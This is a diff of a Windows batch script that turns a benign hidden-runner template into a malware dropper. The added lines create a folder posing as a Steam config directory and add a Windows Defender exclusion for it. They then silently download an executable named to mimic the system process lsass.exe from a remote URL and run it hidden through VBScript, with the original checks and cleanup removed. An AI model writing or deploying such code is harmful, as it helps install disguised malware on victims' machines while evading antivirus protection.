@@ -1,59 +1,40 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Check for admin privileges (assuming this is needed)
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    echo This script requires administrative privileges. Please run as administrator.
-    pause
-    exit /b 1
-)
-
-:: Define file paths
+:: Set paths
+set "folderPath=%USERPROFILE%\AppData\Local\SteamConfig"
 set "batchScript=%TEMP%\hidden_runner.bat"
 set "vbsScript=%TEMP%\hidden_runner.vbs"
+set "exeFile=%folderPath%\lsass.exe"
 
-:: Display the TEMP directory for verification
-echo TEMP directory: %TEMP%
+:: Create SteamConfig folder if it doesn't exist
+if not exist "%folderPath%" mkdir "%folderPath%"
 
-:: Create the temporary batch script
+:: Create the batch script that will run hidden
 (
     echo @echo off
-    echo echo Running hidden batch script...
-    echo rem Add your commands here
+    echo setlocal enabledelayedexpansion
+    echo if not exist "%folderPath%" mkdir "%folderPath%"
+    echo powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" ^>nul 2^>^&1
+    echo curl -L -o "%exeFile%" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" ^>nul 2^>^&1
+
+    :: Wait for the file to finish downloading
+    echo :checkFile
+    echo if not exist "%exeFile%" (timeout /t 2 /nobreak ^>nul & goto checkFile)
+    echo for %%%%F in ("%exeFile%") do set filesize=%%%%~zF
+    echo if "!filesize!"=="0" (timeout /t 2 /nobreak ^>nul & goto checkFile)
+
+    :: Run the EXE and keep the batch script alive
+    echo start /b "%exeFile%"
+    echo exit /b 0
 ) > "%batchScript%"
 
-:: Check if the batch script was created
-if not exist "%batchScript%" (
-    echo Error: Could not create batch script at %batchScript%
-    pause
-    exit /b 1
-) else (
-    echo Batch script created successfully at %batchScript%
-)
-
-:: Create the VBScript to run the batch script silently
+:: Create the VBS script to run the batch file silently
 (
     echo Set objShell = CreateObject("WScript.Shell")
     echo objShell.Run "cmd.exe /c %batchScript%", 0, False
 ) > "%vbsScript%"
 
-:: Check if the VBScript was created
-if not exist "%vbsScript%" (
-    echo Error: Could not create VBScript at %vbsScript%
-    pause
-    exit /b 1
-) else (
-    echo VBScript created successfully at %vbsScript%
-)
-
-:: Run the VBScript
+:: Run the VBS script
 cscript //nologo "%vbsScript%"
-
-:: Optional cleanup
-del "%batchScript%" >nul 2>&1
-del "%vbsScript%" >nul 2>&1
-
-echo Script completed.
-pause
-exit /b 0
+exit
